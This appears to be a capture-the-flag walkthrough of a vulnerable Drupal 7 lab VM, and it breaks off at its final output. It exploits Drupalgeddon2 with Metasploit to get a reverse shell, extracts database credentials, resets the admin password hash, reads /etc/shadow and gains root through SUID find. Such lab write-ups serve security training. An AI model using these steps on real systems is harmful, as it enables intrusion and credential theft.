Exploitation
Drupalgeddon2 (CVE-2018-7600)
Drupal 7 is susceptible to Drupalgeddon2, an unauthenticated remote code execution vulnerability. We use Metasploit's module for a reliable reverse shell.

Launch Metasploit:

bash
msfconsole
Configure the exploit:

msf
use unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.56.101
set LHOST 192.168.56.100      # Your Kali IP
set LPORT 4444
run
Receive Meterpreter session:

text
[*] Meterpreter session 1 opened (192.168.56.100:4444 -> 192.168.56.101:50978)
Shell Stabilisation
Drop into a system shell and upgrade it using Python (since Python 2 is available):

meterpreter
shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Now you have a stable interactive shell as www-data.

Post-Exploitation & Flag Hunting
Flag 1
Navigate to the web root:

bash
cd /var/www
ls -la
cat flag1.txt
Output:

text
Every good CMS needs a config file - and so do you.
✅ Flag1 obtained. The hint points toward Drupal's configuration file.

Flag 2
Examine Drupal's settings file for database credentials:

bash
cat /var/www/sites/default/settings.php | grep -A 10 "databases"
Credentials:

php
'database' => 'drupaldb',
'username' => 'dbuser',
'password' => 'R0ck3t',
The actual Flag2 is the Drupal admin password. You can either:

Crack the hash from the database (would take too long on a typical VM), OR

Reset the password directly (faster and practical).

Resetting the admin password:

Generate a new Drupal 7 hash using the built-in script:

bash
cd /var/www
php scripts/password-hash.sh '123456'
Output:

text
password: 123456                hash: $S$DwPjF8BALZEmDp.qumhJV6WmDISclkh3bqnVPrioVPfq5ugR3djz
Log into MySQL and update the admin user:

bash
mysql -u dbuser -p
Enter password: R0ck3t

sql
use drupaldb;
update users set pass='$S$DwPjF8BALZEmDp.qumhJV6WmDISclkh3bqnVPrioVPfq5ugR3djz' where name='admin';
exit;
Now you can log in to the Drupal web interface (http://192.168.56.101/user/login) with:

Username: admin

Password: 123456

✅ Flag2 is essentially the ability to access the admin dashboard (or the original cracked password bubbles if you had cracked it).

Privilege Escalation to Root
Following the hint from Flag3, we locate the find binary with the SUID bit set:

bash
which find
ls -la /usr/bin/find
Output:

text
-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
The s in the owner's permissions means find executes with root privileges. We can abuse this to read the shadow file or spawn a root shell.

Read /etc/shadow (optional):
bash
find /etc/shadow -exec cat {} \; 2>/dev/null
Spawn a root shell:
bash
find . -exec /bin/sh \; -quit
Verify:

text
# whoami
root
We are now root! 🎉

Final Flag
Navigate to the root home directory and retrieve the final flag:

bash
cd /root
find /root -name "*.txt" -exec cat {} \; 2>/dev/null
Output:
